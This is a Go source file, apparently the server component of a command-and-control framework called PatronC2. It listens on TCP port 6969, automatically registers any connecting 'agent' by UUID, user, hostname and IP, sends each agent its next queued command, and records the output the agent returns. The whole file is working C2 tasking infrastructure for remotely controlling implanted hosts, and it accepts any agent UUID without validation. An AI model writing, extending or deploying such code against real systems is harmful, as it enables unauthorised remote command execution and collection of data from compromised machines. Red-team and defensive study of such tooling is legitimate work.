package main

import (
	"bufio"
	"encoding/gob"
	"log"
	"net"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// TODO add logging
// client connect, callback

func handleconn(connection net.Conn) {
	for {
		text, _ := bufio.NewReader(connection).ReadString('\n')
		message := strings.Split(text, "\n")
		// fmt.Println(message[0])
		if message[0] != "" {
			// slpit message
			glob := strings.Split(message[0], ":")
			uid := glob[0]
			user := glob[1]
			hostname := glob[2]
			ip := glob[3]
			// search uuid in database using received uuid
			fetch := data.FetchOneAgent(uid) // first pass agent check
			if fetch.Uuid == "" {            //prob check its a uuid                 // future fix (accepts all uuid) reason: to allow server create agent record in db
				//parse IP, hostname and user from agent
				data.CreateAgent(uid, "127.0.0.1", "5", "5", ip, user, hostname) // default values (callback set by user)
			}
			fetch = data.FetchOneAgent(uid) // second pass agent check

			logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
			if uid == fetch.Uuid {
				// fmt.Fprintf(connection, "Yes\n")
				// _, _ = connection.Write([]byte("Yes\n"))

				logger.Logf(logger.Info, "Agent %s Connected\n", uid)
				encoder := gob.NewEncoder(connection)
				instruct := data.FetchNextCommand(fetch.Uuid)
				logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
				if err := encoder.Encode(instruct); err != nil {
					log.Fatalln(err)
				}
				destruct := &types.GiveServerResult{}
				dec := gob.NewDecoder(connection)
				dec.Decode(destruct)

				if destruct.Result == "2" {
					logger.Logf(logger.Debug, "Agent %s Sent Nothing Back\n", uid)
				} else {
					logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
					data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, fetch.Uuid)
				}
			} else {
				// agent not in database handle creation of agent
				logger.Logf(logger.Info, "Agent Unknown\n")
			}
			// if key is on

		}
	}

}

func main() {
	data.OpenDatabase()
	data.InitDatabase()
	// _, error := os.Stat("./data/sqlite-database.db")
	// if os.IsNotExist(error) {
	// 	data.InitDatabase()
	// }
	listener, err := net.Listen("tcp", ":6969")
	if err != nil {
		log.Fatalln(err)
	}

	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			log.
				Fatalln(err)
		}
		go handleconn(connection)

	}
}
